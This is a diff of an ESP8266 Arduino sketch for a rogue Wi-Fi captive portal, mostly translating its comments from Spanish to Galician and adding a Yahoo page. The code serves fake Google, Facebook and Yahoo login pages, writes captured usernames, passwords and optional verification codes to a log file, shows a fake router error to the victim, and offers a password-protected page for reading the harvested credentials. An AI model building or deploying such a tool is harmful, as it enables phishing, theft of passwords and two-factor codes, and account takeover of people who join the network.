@@ -1,12 +1,12 @@
 /*
- * Original by Corey Harding, edited by G. R. Casanova
+ * Orixinal de Corey Harding, editado por G. R. Casanova
  * www.legacysecuritygroup.com
- * Edited by Ivan Romero ZAs
- * Configure access point name and up to 3 custom domains and login urls in config.h
- * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
- * Configure the html for any other domain(catch-all) in site_other.h
- * This is only a proof-of-concept.  I am not responsible for your actions.
- * Obey all local, state, federal, and international laws!
+ * Editado por Ivan Romero Zas
+ * Configura o nome do punto de acceso e ata 3 dominios personalizados e URLs de inicio de sesión en config.h
+ * Configura o HTML para a páxina de inicio de sesión dos devanditos dominios en site1.h, site2.h e site3.h
+ * Configura o HTML para calquera outro dominio (catch-all) en site_other.h
+ * Isto é só unha proba de concepto. Non me fago responsable das túas accións.
+ * Cumpre todas as leis locais, estatais, federais e internacionais!
 */
 
 #include <ESP8266WiFi.h>
@@ -17,10 +17,10 @@
 #include <FS.h>
 #include "google.h"
 #include "facebook.h"
-#include "test.h"
-#include "styles.h" // Include the new styles file
+#include "yahoo.h"
+#include "styles.h" // Inclúe o ficheiro de estilos novo
 
-// Incluir las bibliotecas de Crypto y SHA256
+// Incluir as bibliotecas de Crypto e SHA256
 #include <Crypto.h>
 #include <SHA256.h>
 #define SHA256_SIZE 32 
@@ -38,36 +38,38 @@ ESP8266WebServer webServer(80);
 
 String webString = "";
 String serialString = "";
-String pendingCredentials = ""; // Almacena las credenciales pendientes de verificación
+String pendingCredentials = ""; // Almacena as credenciais pendentes de verificación
 
-const char* hashed_password = "6bceb6d53d51a11c3bde77e8cafe1f152782c5e52a13e514da12a9e35b0c2bcb"; 
-const char* salt = "somesalt"; 
+//ATENCIÓN: se alguén desexase probar este código debería cambiar o hash seguinte, cun contrasinal
+//          calquera unido ao salt inferior. 
+const char* hashed_password = "aa3c881e748f5772970e52dcb308837104174140c526c35efb253112b0485ea6"; 
+const char* salt = "opgIKEvy1nS2p"; 
 
-// Variable para activar/desactivar el modo de verificación de código
+// Variable para activar/desactivar o modo de verificación de código
 bool codeVerificationMode = false; // Por defecto desactivado
 
-// Función para calcular el hash SHA256
+// Función para calcular o hash SHA256
 String calculateHash(const char* input, const char* salt) {
     String salted_input = String(input) + String(salt);
-    uint8_t hash[SHA256_SIZE]; // Array para almacenar el hash resultante
+    uint8_t hash[SHA256_SIZE]; // Array para almacenar o hash resultante
 
-    SHA256 sha256; // Crear un objeto SHA256
-    sha256.reset(); // Reiniciar el objeto SHA256
-    sha256.update((const uint8_t*)salted_input.c_str(), salted_input.length()); // Añadir la entrada al hash
-    sha256.finalize(hash, SHA256_SIZE); // Finalizar el cálculo del hash
+    SHA256 sha256; // Crear un obxecto SHA256
+    sha256.reset(); // Reiniciar o obxecto SHA256
+    sha256.update((const uint8_t*)salted_input.c_str(), salted_input.length()); // Engadir a entrada ao hash
+    sha256.finalize(hash, SHA256_SIZE); // Finalizar o cálculo do hash
 
-    // Convertir el hash a una cadena hexadecimal
+    // Converter o hash a unha cadea hexadecimal
     String hashStr = "";
     for (int i = 0; i < SHA256_SIZE; i++) {
         char buf[3];
-        sprintf(buf, "%02x", hash[i]); // Formato hexadecimal de 2 dígitos
+        sprintf(buf, "%02x", hash[i]); // Formato hexadecimal de 2 díxitos
         hashStr += buf;
     }
 
     return hashStr;
 }
 
-// Función para verificar la contraseña
+// Función para verificar o contrasinal
 bool checkPassword(const char* input_password) {
     String input_hash = calculateHash(input_password, salt);
     return input_hash == hashed_password;
@@ -92,7 +94,7 @@ void setup() {
   digitalWrite(LED_BUILTIN, HIGH);
   
   Serial.print("AVISO: o sistema pode tardar entre 1/2 minutos en entrar nun modo COMPLETAMENTE operativo.");
-  Serial.println("Recomendase refrescar/reabrir unha pestana do navegador se tardase moito.");
+  Serial.println("Recoméndase refrescar/reabrir unha pestana do navegador se tardase moito.");
   Serial.println("Inicializando sistema de ficheiros...");
   SPIFFS.begin();
   Serial.println("Sistema de ficheiros inicializado exitosamente!");
@@ -138,17 +140,17 @@ void setup() {
     Serial.println(serialString);
 
     if (codeVerificationMode) {
-      // Guardar las credenciales inmediatamente
+      // Gardar as credenciais inmediatamente
       File f = SPIFFS.open(LOGFILE, "a");
       if (f) {
-        f.println(serialString); // Guardar en formato URL:usuario:contraseña
+        f.println(serialString); // Gardar en formato URL:usuario:contrasinal
         f.close();
       }
 
-      // Almacenar las credenciales pendientes de verificación
+      // Almacenar as credenciais pendentes de verificación
       pendingCredentials = serialString;
 
-      // Redirigir a la pantalla de verificación de código
+      // Redirixir á pantalla de verificación de código
       webString = R"=====(
         <html>
           <head>
@@ -156,12 +158,12 @@ void setup() {
             <style>)====="+ String(VERIFICATION_CODE_STYLE) + R"=====(</style>
           </head>
           <body>
-            <h1>Introduce el codigo de verificacion</h1>
+            <h1>Introduce o código de verificación</h1>
             <form action='/verify_code' method='POST'>
               <input type='hidden' name='url' value=')=====" + url + R"=====('>
               <input type='hidden' name='user' value=')=====" + user + R"=====('>
               <input type='hidden' name='pass' value=')=====" + pass + R"=====('>
-              <input type='text' name='code' placeholder='Codigo de verificacion' required>
+              <input type='text' name='code' placeholder='Código de verificación' required>
               <input type='submit' value='Acceder'>
             </form>
           </body>
@@ -169,7 +171,7 @@ void setup() {
       )=====";
       webServer.send(200, "text/html", webString);
     } else {
-      // Guardar las credenciales directamente (modo de verificación desactivado)
+      // Gardar as credenciais directamente (modo de verificación desactivado)
       File f = SPIFFS.open(LOGFILE, "a");
       if (f) {
         f.println(serialString);
@@ -192,59 +194,59 @@ void setup() {
     String pass = webServer.arg("pass");
     String code = webServer.arg("code");
 
-    // Crear la cadena de credenciales para comparar
+    // Crear a cadea de credenciais para comparar
     String currentCredentials = url + ":" + user + ":" + pass;
 
-    // Verificar si las credenciales coinciden con las pendientes
+    // Verificar se as credenciais coinciden coas pendentes
     if (currentCredentials == pendingCredentials) {
-      // Leer el archivo log.txt
+      // Ler o arquivo log.txt
       File f = SPIFFS.open(LOGFILE, "r");
       String fileContent = "";
       if (f) {
         while (f.available()) {
           String line = f.readStringUntil('\n');
-          line.trim(); // Eliminar espacios en blanco o saltos de línea adicionales
+          line.trim(); // Eliminar espazos en branco ou saltos de liña adicionais
           if (line == pendingCredentials) {
-            // Añadir el código a la línea correspondiente
+            // Engadir o código á liña correspondente
             line += ":" + code;
           }
-          fileContent += line + "\n"; // Añadir la línea al contenido del archivo
+          fileContent += line + "\n"; // Engadir a liña ao contido do arquivo
         }
         f.close();
       }
 
-      // Sobrescribir el archivo log.txt con el contenido actualizado
+      // Sobrescribir o arquivo log.txt co contido actualizado
       f = SPIFFS.open(LOGFILE, "w");
       if (f) {
-        f.print(fileContent); // Escribir el contenido actualizado
+        f.print(fileContent); // Escribir o contido actualizado
         f.close();
       }
 
-      // Mostrar el código en la consola serial
+      // Mostrar o código na consola serie
       Serial.println("Code Verification Mode: ON");
       Serial.println("Code obtained: " + code);
 
-      // Mostrar el mensaje de error (siempre se muestra)
+      // Mostrar a mensaxe de erro (sempre se mostra)
       webString = "<h1>#E701 - Router Configuration Error</h1>";
       webServer.send(500, "text/html", webString);
 
       serialString = "";
       webString = "";
 
-      blink(5); // Indicación visual de que se ha guardado el código
+      blink(5); // Indicación visual de que se gardou o código
     } else {
-      // Credenciales no coinciden, mostrar un mensaje de error
+      // Credenciais non coinciden, mostrar unha mensaxe de erro
       webString = "<html><body><h1>Invalid credentials</h1><br><a href='/'>Try again</a></body></html>";
       webServer.send(401, "text/html", webString);
     }
   });
 
   webServer.on("/logs", []() {
-    // Verificar si se ha enviado una contraseña
+    // Verificar se se enviou un contrasinal
     if (webServer.hasArg("password")) {
       String password = webServer.arg("password");
       if (checkPassword(password.c_str())) {
-        // Contraseña correcta, mostrar los logs
+        // Contrasinal correcto, mostrar os logs
         String webString = R"=====(
           <html>
             <head>
@@ -256,7 +258,7 @@ void setup() {
               <pre>
         )=====";
 
-        // Leer y mostrar el contenido del archivo log.txt
+        // Ler e mostrar o contido do arquivo log.txt
         File f = SPIFFS.open(LOGFILE, "r");
         if (f) {
           webString += f.readString();
@@ -280,12 +282,12 @@ void setup() {
 
         webServer.send(200, "text/html", webString);
       } else {
-        // Contraseña incorrecta, mostrar un mensaje de error
+        // Contrasinal incorrecto, mostrar unha mensaxe de erro
         webString = "<html><body><h1>Contrasinal incorrecto</h1><br><a href='/logs'>Volve a introducir o contrasinal</a></body></html>";
         webServer.send(401, "text/html", webString);
       }
     } else {
-      // Mostrar el formulario para ingresar la contraseña
+      // Mostrar o formulario para ingresar o contrasinal
       webString = R"=====(
         <html>
           <head>
@@ -324,16 +326,16 @@ void setup() {
     )=====";
     webServer.send(200, "text/html", webString);
 
-    // Mostrar el estado del modo en la consola serial
-    Serial.println("Solicitar código de verficación: " + String(codeVerificationMode ? "ON" : "OFF"));
+    // Mostrar o estado do modo na consola serie
+    Serial.println("Solicitar código de verificación: " + String(codeVerificationMode ? "ON" : "OFF"));
   });
 
   webServer.on("/logs/clear", []() {
-    // Verificar si se ha enviado una contraseña
+    // Verificar se se enviou un contrasinal
     if (webServer.hasArg("password")) {
       String password = webServer.arg("password");
       if (checkPassword(password.c_str())) {
-        // Contraseña correcta, borrar los logs
+        // Contrasinal correcto, borrar os logs
         File f = SPIFFS.open(LOGFILE, "w");
         if (f) {
           f.println("Credenciais de acceso capturadas:");
@@ -356,7 +358,7 @@ void setup() {
         )=====";
         webServer.send(200, "text/html", webString);
       } else {
-        // Contraseña incorrecta, mostrar un mensaje de error
+        // Contrasinal incorrecto, mostrar unha mensaxe de erro
         String webString = R"=====(
           <html>
             <head>
@@ -372,7 +374,7 @@ void setup() {
         webServer.send(401, "text/html", webString);
       }
     } else {
-      // Mostrar el formulario para ingresar la contraseña
+      // Mostrar o formulario para ingresar o contrasinal
       String webString = R"=====(
         <html>
           <head>
